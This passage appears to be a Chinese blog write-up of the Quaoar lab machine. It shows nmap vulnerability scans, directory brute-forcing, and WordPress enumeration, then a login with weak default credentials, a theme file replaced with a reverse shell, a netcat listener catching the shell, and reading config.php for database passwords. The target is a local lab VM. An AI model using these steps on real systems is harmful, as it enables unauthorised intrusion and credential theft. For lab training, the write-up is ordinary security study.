class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">445/tcp open  microsoft-ds</span><br><span class="hljs-string">993/tcp open  imaps</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">995/tcp open  pop3s</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">MAC Address: 08:00:27:A6:AE:F1 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-vuln-regsvc-dos: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="hljs-string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="hljs-string">|       while working on smb-enum-sessions.</span><br><span class="hljs-string">|_          </span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br><span class="hljs-string">|_smb-vuln-ms10-061: false</span><br></code></pre></td></tr></table></figure>
+
+<p>目录爆破一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.145 -w /usr/share/seclists/Discovery/Web-Content/big.txt<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.145<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/24 03:56:43 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.htaccess            (Status: 403) [Size: 291]<br>/.htpasswd            (Status: 403) [Size: 291]<br>/LICENSE              (Status: 200) [Size: 1672]<br>/cgi-bin/             (Status: 403) [Size: 290]<br>/hacking              (Status: 200) [Size: 616848]<br>/index                (Status: 200) [Size: 100]<br>/robots               (Status: 200) [Size: 271]<br>/robots.txt           (Status: 200) [Size: 271]<br>/server-status        (Status: 403) [Size: 295]<br>/upload               (Status: 301) [Size: 317] [--&gt; http://192.168.56.145/upload/]<br>/wordpress            (Status: 301) [Size: 320] [--&gt; http://192.168.56.145/wordpress/]<br>Progress: 20051 / 20477 (97.92%)<br>===============================================================<br>2023/09/24 03:56:47 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>wpscan 一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ wpscan --url http://192.168.56.145/wordpress/ -e u,ap<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | |_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://192.168.56.145/wordpress/ [192.168.56.145]<br>[+] Started: Sun Sep 24 03:57:20 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.2.22 (Ubuntu)<br> |  - X-Powered-By: PHP/5.3.10-1ubuntu3<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.145/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.145/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.145/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.145/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.145/wordpress/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br> |  - http://192.168.56.145/wordpress/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyfourteen<br> | Location: http://192.168.56.145/wordpress/wp-content/themes/twentyfourteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.6<br> | Style URL: http://192.168.56.145/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14<br> | Style Name: Twenty Fourteen<br> | Style URI: http://wordpress.org/themes/twentyfourteen<br> | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...<br> | Author: the WordPress team<br> | Author URI: http://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.1 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.145/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14, Match: <span class="hljs-string">&#x27;Version: 1.1&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] mail-masta<br> | Location: http://192.168.56.145/wordpress/wp-content/plugins/mail-masta/<br> | Latest Version: 1.0 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2014-09-19T07:52:00.000Z<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.0 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://192.168.56.145/wordpress/wp-content/plugins/mail-masta/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:01 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:01<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Author Posts - Display Name (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] wpuser<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sun Sep 24 03:57:25 2023<br>[+] Requests Done: 28<br>[+] Cached Requests: 39<br>[+] Data Sent: 7.855 KB<br>[+] Data Received: 47.094 KB<br>[+] Memory used: 252.723 MB<br>[+] Elapsed time: 00:00:05<br></code></pre></td></tr></table></figure>
+
+<p>mail-masta 插件、<code>wpuser, admin</code> 用户名</p>
+<h2 id="Wordpress-渗透"><a href="#Wordpress-渗透" class="headerlink" title="Wordpress 渗透"></a>Wordpress 渗透</h2><p>尝试爆破，先试试 admin:admin 弱密码</p>
+<p><img src="/pic/653421b2b6905dd550b0bb2089b8d15c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>竟然一下子进去了，省的爆破了</p>
+<p><img src="/pic/41d51433d203b513390826e1c5d81db9_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改 404.php 为反弹 shell 的代码，提前开启监听，访问 <code>192.168.56.145/wordpress/wp-content/themes/twentyfourteen/404.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nc -lvnp 443                                                         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.145] 51895<br>Linux Quaoar 3.2.0-23-generic-pae <span class="hljs-comment">#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 athlon i386 GNU/Linux</span><br> 12:06:52 up 1 day,  1:26,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.04, 0.08<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 athlon i386 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:a6:ae:f1 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.145/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fea6:aef1/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN </span><br><span class="hljs-string">    link/ether e2:90:ba:43:68:7b brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@Quaoar:/</span><br></code></pre></td></tr></table></figure>
+
+<p>查看网站根目录，寻找数据库密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/var$ <span class="hljs-built_in">cd</span> www<br><span class="hljs-built_in">cd</span> www<br>www-data@Quaoar:/var/www$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>CHANGELOG                       hack-planet-high-definition-mobile.jpg<br>COPYING                         hacker-manifesto-ethical.jpg<br>Hack_The_Planet.jpg             hacking.jpg<br>Hack_The_Planet2.jpg            hsperfdata_tomcat6<br>Hack_The_Planet3.jpg            index.html<br>INSTALL                         pososibo-ethical-hacking-hack-fond.jpg<br>LICENSE                         robots.txt<br>Quaoar.jpg                      tomcat6-tomcat6-tmp<br>README.md                       upload<br>hack-planet-1280-amox-zone.jpg  wordpress<br>www-data@Quaoar:/var/www$ <span class="hljs-built_in">cd</span> upload<br><span class="hljs-built_in">cd</span> upload<br>www-data@Quaoar:/var/www/upload$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>account  config.php  include    languages  modules  search  templates<br>admins   framework   index.php  media      page     temp<br>www-data@Quaoar:/var/www/upload$ <span class="hljs-built_in">cat</span> config.php<br><span class="hljs-built_in">cat</span> config.php<br>&lt;?php<br><br><span class="hljs-keyword">if</span>(defined(<span class="hljs-string">&#x27;LEPTON_PATH&#x27;</span>)) &#123; die(<span class="hljs-string">&#x27;By security reasons it is not permitted to load \&#x27;</span>config.php\<span class="hljs-string">&#x27; twice!! Forbidden call from \&#x27;</span><span class="hljs-string">&#x27;.$_SERVER[&#x27;</span>SCRIPT_NAME<span class="hljs-string">&#x27;].&#x27;</span>\<span class="hljs-string">&#x27;!&#x27;</span>); &#125;<br><br>// config file created by LEPTON 2.2.0<br>define(<span class="hljs-string">&#x27;DB_TYPE&#x27;</span>, <span class="hljs-string">&#x27;mysql&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PORT&#x27;</span>, <span 